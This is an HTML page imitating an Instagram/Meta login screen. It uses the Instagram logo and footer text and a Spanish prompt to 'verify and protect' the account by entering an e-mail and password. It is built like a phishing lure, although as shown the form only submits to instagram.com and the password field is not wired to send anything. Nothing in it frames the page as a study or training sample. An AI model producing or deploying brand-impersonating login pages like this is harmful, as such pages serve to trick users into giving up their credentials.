<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Help</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1a1a1a;
            padding: 40px;
            border-radius: 8px;
            width: 400px;
            text-align: center;
        }
        .logo {
            font-size: 36px;
            font-weight: bold;
            color: #fff;
        }
        .heading {
            margin-top: 20px;
            font-size: 18px;
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            border: 1px solid #333;
            background-color: #2a2a2a;
            color: #fff;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #3897f0;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #2973c1;
        }
        .links {
            margin-top: 20px;
            font-size: 14px;
        }
        .links a {
            color: #8e8e8e;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #8e8e8e;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yv/r/KoLLpWDb4f6.png" alt="Instagram Logo" width="100">
        </div>
        <p>Inicia sesión para verificar y proteger tu cuenta.</p>
        <form action="https://www.instagram.com/" method="get">
            <!-- Campo para E-mail -->
            <input type="email" class="input-field" placeholder="E-mail" name="email" required>            
            <!-- Campo para Contraseña -->
            <input type="text" class="input-field" placeholder="Contraseña" required>
            <button type="submit" class="submit-btn">Verificar cuenta</button>
        </form>
        <div class="links">
            <p><a href="#">¿Has olvidado tu contraseña?</a></p>
            <p><a href="#">Crear una cuenta nueva</a></p>
        </div>
        <div class="footer">
            <p>Meta</p>
            <p>About Blog Jobs Help Privacy Consumer Health Privacy Cookie settings Terms Locations Instagram Lite Threads</p>
            <p>Contact uploading and non-users | Meta Verified | © 2024 Instagram from Meta</p>
        </div>
    </div>
</body>
</html>
